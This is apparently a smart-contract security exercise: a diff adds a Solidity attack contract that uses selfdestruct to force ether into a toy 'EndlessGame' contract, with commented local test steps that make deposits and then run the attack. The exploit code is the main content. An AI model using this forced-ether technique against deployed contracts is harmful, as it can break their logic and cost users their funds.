@@ -19,3 +19,28 @@ contract EndlessGame {
     require(sent, "Failed to send Ether");
   }
 }
+
+contract GameOverAttack {
+  EndlessGame endlessGame;
+  constructor (EndlessGame _endlessGame) public {
+    endlessGame = EndlessGame(_endlessGame);
+  }
+  function attack() public payable {
+    address payable addr = payable(address(endlessGame));
+    selfdestruct(addr);
+  }
+}
+
+
+
+//e = EndlessGame.deploy({'from': accounts[0]})
+//e.deposit({'from': accounts[1], 'value': 1000000000000000000})
+//e.deposit({'from': accounts[2], 'value': 1000000000000000000})
+//e.deposit({'from': accounts[3], 'value': 1000000000000000000})
+//e.deposit({'from': accounts[4], 'value': 1000000000000000000})
+//e.deposit({'from': accounts[2], 'value': 1000000000000000000})
+//e.deposit({'from': accounts[3], 'value': 1000000000000000000})
+//e.deposit({'from': accounts[4], 'value': 1000000000000000000})
+//e.deposit({'from': accounts[1], 'value': 1000000000000000000})
+//a = GameOverAttack.deploy(e.address,{'from': accounts[2]})
+//a.attack({'from': accounts[2], 'value': 3000000000000000000})
